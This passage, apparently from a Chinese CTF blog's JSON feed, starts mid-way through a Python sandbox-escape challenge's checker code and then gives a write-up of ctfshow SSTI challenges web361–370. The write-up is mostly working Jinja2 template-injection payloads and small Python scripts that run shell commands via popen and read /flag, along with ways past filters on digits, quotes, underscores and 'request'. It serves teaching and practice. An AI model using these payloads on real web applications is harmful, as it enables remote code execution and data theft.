class=\"line\">                <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">                os._exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> audit</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">source_opcode_checker</span>(<span class=\"params\">code</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class=\"line\"><span class=\"string\">    :param code: source code</span></span><br><span class=\"line\"><span class=\"string\">    :return: None</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">from</span> dis <span class=\"keyword\">import</span> dis</span><br><span class=\"line\">    <span class=\"keyword\">from</span> builtins <span class=\"keyword\">import</span> <span class=\"built_in\">str</span></span><br><span class=\"line\">    <span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> StringIO</span><br><span class=\"line\">    <span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> exit</span><br><span class=\"line\"></span><br><span class=\"line\">    opcodeIO = StringIO()</span><br><span class=\"line\">    dis(code, file=opcodeIO)</span><br><span class=\"line\">    opcode = opcodeIO.getvalue().split(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    opcodeIO.close()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> opcode:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">any</span>(x <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(line) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [<span class=\"string\">&quot;LOAD_GLOBAL&quot;</span>, <span class=\"string\">&quot;IMPORT_NAME&quot;</span>, <span class=\"string\">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">any</span>(x <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(line) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [<span class=\"string\">&quot;randint&quot;</span>, <span class=\"string\">&quot;randrange&quot;</span>, <span class=\"string\">&quot;print&quot;</span>, <span class=\"string\">&quot;seed&quot;</span>]):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>.join([x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [<span class=\"string\">&quot;LOAD_GLOBAL&quot;</span>, <span class=\"string\">&quot;IMPORT_NAME&quot;</span>, <span class=\"string\">&quot;LOAD_METHOD&quot;</span>] <span class=\"keyword\">if</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(line)]))</span><br><span class=\"line\">            exit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">from</span> builtins <span class=\"keyword\">import</span> <span class=\"built_in\">open</span></span><br><span class=\"line\">    <span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> addaudithook</span><br><span class=\"line\">    <span class=\"keyword\">from</span> contextlib <span class=\"keyword\">import</span> redirect_stdout</span><br><span class=\"line\">    <span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> randint, randrange, seed</span><br><span class=\"line\">    <span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> StringIO</span><br><span class=\"line\">    <span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> seed</span><br><span class=\"line\">    <span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">    source = <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\">    source_simple_check(source)</span><br><span class=\"line\">    source_opcode_checker(source)</span><br><span class=\"line\">    code = <span class=\"built_in\">compile</span>(source, <span class=\"string\">&quot;&lt;sandbox&gt;&quot;</span>, <span class=\"string\">&quot;exec&quot;</span>)</span><br><span class=\"line\">    addaudithook(block_wrapper())</span><br><span class=\"line\">    outputIO = StringIO()</span><br><span class=\"line\">    <span class=\"keyword\">with</span> redirect_stdout(outputIO):</span><br><span class=\"line\">        seed(<span class=\"built_in\">str</span>(time()) + <span class=\"string\">&quot;THIS_IS_SEED&quot;</span> + <span class=\"built_in\">str</span>(time()))</span><br><span class=\"line\">        <span class=\"built_in\">exec</span>(code, &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__builtins__&quot;</span>: <span class=\"literal\">None</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;randint&quot;</span>: randint,</span><br><span class=\"line\">            <span class=\"string\">&quot;randrange&quot;</span>: randrange,</span><br><span class=\"line\">            <span class=\"string\">&quot;seed&quot;</span>: seed,</span><br><span class=\"line\">            <span class=\"string\">&quot;print&quot;</span>: <span class=\"built_in\">print</span></span><br><span class=\"line\">        &#125;, <span class=\"literal\">None</span>)</span><br><span class=\"line\">    output = outputIO.getvalue()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;THIS_IS_SEED&quot;</span> <span class=\"keyword\">in</span> output:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(output)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t首先是 <code>source_simple_check()</code>  函数，这个函数简单来说就是给 所有全角字符都 ban 了，无法使用，以及三个关键字，也给 ban 了。</p>\n<p>​\t\t之后是 <code>block_wrapper()</code> ，检测代码执行过程中事件和参数是否含有那些关键字 。</p>\n<p>​\t\t之后是 <code>source_opcode_checker()</code> ，目的为检测用户程序的操作码中是否含有访问全局变量、导入模块以及方法。</p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/4826d2ce.html",
            "url": "http://blog.g01den.top/posts/4826d2ce.html",
            "title": "ctfshow-SSTI",
            "date_published": "2025-05-03T15:19:26.000Z",
            "content_html": "<h1 id=\"web361\"><a class=\"markdownIt-Anchor\" href=\"#web361\">#</a> web361：</h1>\n<p>​\t\tname 传参，直接干：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> get</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_wrap</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>,<span class=\"number\">200</span>):</span><br><span class=\"line\">        url = <span class=\"string\">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;]&#125;&#125;&quot;</span></span><br><span class=\"line\">        resp = get(url)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;os._wrap_close&quot;</span> <span class=\"keyword\">in</span> resp.text:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">poc</span>():</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        cmd = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;Enter your command: &#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cmd == <span class=\"string\">&#x27;0&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            url = <span class=\"string\">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class=\"string\">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class=\"line\">            anser = get(url).text</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(anser)</span><br><span class=\"line\">poc()</span><br></pre></td></tr></table></figure>\n<p>​\t<strong>补充：几种手法</strong></p>\n<blockquote>\n<ul>\n<li>手法一：payload os.warp_close 类 的 popen 方法</li>\n<li>?name= <code>&#123;&#123;\"\".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen'](\"cat /flag\").read()&#125;&#125;</code></li>\n<li>手法二： 利用 config：</li>\n<li>?name= <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125;</code></li>\n<li>手法三： <code>lipsum.__globals__</code> 含有 os 模块：</li>\n<li>?name= <code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li>\n<li>手法三：利用 <code>__builtins__</code></li>\n<li>?name= <code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li>\n<li>?name= <code>&#123;&#123;url_for.__globals__.__builtins__.eval(\"__import__('os').popen('cat /flag').read()\")&#125;&#125;</code></li>\n</ul>\n</blockquote>\n<h1 id=\"web362\"><a class=\"markdownIt-Anchor\" href=\"#web362\">#</a> web362：</h1>\n<p>​\t\t过滤了数字 2，3，上没有数字的 payload 就行了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> get</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">poc</span>():</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        cmd = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;Enter your command: &#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cmd == <span class=\"string\">&#x27;0&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            url = <span class=\"string\">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class=\"string\">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class=\"line\">            anser = get(url).text</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(anser)</span><br><span class=\"line\">poc()</span><br></pre></td></tr></table></figure>\n<p>​\t\t另外的 payload：</p>\n<ul>\n<li>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">26</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">27</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#先利用 join 和 count 过滤器得到数字 2，然后再用 66*2 去得到 132</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>code￼<span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n<li>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">28</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">29</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>code￼<span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n</ul>\n<p>​\t\tpayload2：这里用 config 拿到字符串，比较麻烦就不全演示了，只演示部分：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class=\"number\">2</span>])%2B(config.__str__()[<span class=\"number\">42</span>])]&#125;&#125;</span><br><span class=\"line\">相当于</span><br><span class=\"line\">?name=&#123;&#123;url_for.__globals__[<span class=\"string\">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\tpayload3：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=url_for.__globals__.__builtins__.<span class=\"built_in\">chr</span> %&#125;&#123;% <span class=\"built_in\">print</span>  url_for.__globals__[<span class=\"built_in\">chr</span>(<span class=\"number\">111</span>)%2bchr(<span class=\"number\">115</span>)]%&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">使用</span><br><span class=\"line\">?name=&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=url_for.__globals__.__builtins__.<span class=\"built_in\">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class=\"built_in\">chr</span>(<span class=\"number\">111</span>)%2bchr(<span class=\"number\">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web364\"><a class=\"markdownIt-Anchor\" href=\"#web364\">#</a> web364：</h1>\n<p>​\t\t过滤了引号，args，同时不允许使用 POST 传参，使用 Cookie 传参吧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class=\"number\">94</span>][request.cookies.m1](<span class=\"number\">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 Cookie 传入参数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web365\"><a class=\"markdownIt-Anchor\" href=\"#web365\">#</a> Web365：</h1>\n<p>​\t\t这里在上一个题的基础上过滤了中括号，所以得用别的方法：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class=\"number\">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class=\"line\">&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 Cookie 传入：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>\n<p>​\t\t还有个办法，不过是一次性的，失败了之后环境就废了，毕竟 pop 会删除对应的键，导致环境崩溃：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class=\"number\">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t\t\t之后 Cookie 传入：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web366\"><a class=\"markdownIt-Anchor\" href=\"#web366\">#</a> Web366：</h1>\n<p>​\t\t这个题多过滤了下划线，可以用 lipsum 绕过：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 Cookie 传入：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web367\"><a class=\"markdownIt-Anchor\" href=\"#web367\">#</a> Web367：</h1>\n<p>​\t\t这个题又过滤了个 os，直接扔个 payload 吧，Payload 解释问 Ai 都可以问出来：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后传入 Cookie：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure>\n<h1 id=\"web368\"><a class=\"markdownIt-Anchor\" href=\"#web368\">#</a> Web368：</h1>\n<p>​\t\t这个题，需要用到 <code>&#123;% %&#125;</code> ，因为双大括号里的 request 被过滤了，但是 <code>&#123;% %&#125;</code>  中的 request 没有被过滤，和上一个题构造的 payload 一样，不过有点改变，就是没有使用双大括号，所以需要 print 输出以下（类似无回显）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;%<span class=\"built_in\">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web369\"><a class=\"markdownIt-Anchor\" href=\"#web369\">#</a> Web369：</h1>\n<p>​\t\t这里直接给 request 给 ban 了，不过可以自己拼字符串，还算好，直接上最终 payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> po=<span class=\"built_in\">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class=\"built_in\">set</span> a=(()|select|string|<span class=\"built_in\">list</span>)|attr(po)(<span class=\"number\">24</span>)%&#125;&#123;% <span class=\"built_in\">set</span> ini=(a,a,<span class=\"built_in\">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class=\"built_in\">set</span> glo=(a,a,<span class=\"built_in\">dict</span>(<span class=\"built_in\">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class=\"built_in\">set</span> geti=(a,a,<span class=\"built_in\">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class=\"built_in\">set</span> buil=(a,a,<span class=\"built_in\">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class=\"built_in\">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=x.<span class=\"built_in\">chr</span>%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> file=<span class=\"built_in\">chr</span>(<span class=\"number\">47</span>)%2bchr(<span class=\"number\">102</span>)%2bchr(<span class=\"number\">108</span>)%2bchr(<span class=\"number\">97</span>)%2bchr(<span class=\"number\">103</span>)%&#125;&#123;%<span class=\"built_in\">print</span>(x.<span class=\"built_in\">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t看着很长很唬人，但实际确实不简单，这个我会在下一篇文章进行考点总结的，不急，这里先给下解释：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> po=<span class=\"built_in\">dict</span>(po=a,p=a)|join%&#125;          //拼接出pop</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> a=(()|select|string|<span class=\"built_in\">list</span>)|attr(po)(<span class=\"number\">24</span>)%&#125;         //拼接出_</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> ini=(a,a,<span class=\"built_in\">dict</span>(init=a)|join,a,a)|join%&#125;          //拼接出__init__</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> glo=(a,a,<span class=\"built_in\">dict</span>(<span class=\"built_in\">globals</span>=a)|join,a,a)|join()%&#125;       //拼接出__globals__</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> geti=(a,a,<span class=\"built_in\">dict</span>(getitem=a)|join,a,a)|join()%&#125;\t\t//拼接出__getitem__</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> buil=(a,a,<span class=\"built_in\">dict</span>(builtins=a)|join,a,a)|join()%&#125;\t\t//拼接出__builtins__</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;\t\t</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=x.<span class=\"built_in\">chr</span>%&#125;\t\t//使用<span class=\"built_in\">chr</span>类来进行RCE因为等会要<span class=\"built_in\">ascii</span>转字符</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> file=<span class=\"built_in\">chr</span>(<span class=\"number\">47</span>)%2bchr(<span class=\"number\">102</span>)%2bchr(<span class=\"number\">108</span>)%2bchr(<span class=\"number\">97</span>)%2bchr(<span class=\"number\">103</span>)%&#125;\t//拼接出/flag</span><br><span class=\"line\">&#123;%<span class=\"built_in\">print</span>(x.<span class=\"built_in\">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web370\"><a class=\"markdownIt-Anchor\" href=\"#web370\">#</a> Web370：</h1>\n<p>​\t\t这个题过滤了数字，不过可以用全角数字来绕过，转换的代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">half2full</span>(<span class=\"params\">half</span>):</span><br><span class=\"line\">    full = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> half:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(ch) <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>, <span class=\"number\">127</span>):</span><br><span class=\"line\">            ch = <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(ch) + <span class=\"number\">0xfee0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">ord</span>(ch) == <span class=\"number\">32</span>:</span><br><span class=\"line\">            ch = <span class=\"built_in\">chr</span>(<span class=\"number\">0x3000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        full += ch</span><br><span class=\"line\">    <span class=\"keyword\">return</span> full</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    t = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    s = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;输入想要转换的数字字符串：&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        t += half2full(i)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(t)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t得到的 payload 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> po=<span class=\"built_in\">dict</span>(po=a,p=a)|join%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> a=(()|select|string|<span class=\"built_in\">list</span>)|attr(po)(２４)%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> ini=(a,a,<span class=\"built_in\">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> glo=(a,a,<span class=\"built_in\">dict</span>(<span class=\"built_in\">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> geti=(a,a,<span class=\"built_in\">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> built=(a,a,<span class=\"built_in\">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=x.<span class=\"built_in\">chr</span>%&#125;</span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> file=<span class=\"built_in\">chr</span>(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;</span><br><span class=\"line\">&#123;%<span class=\"built_in\">print</span>(x.<span class=\"built_in\">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "Web"
            ]
        },
        {
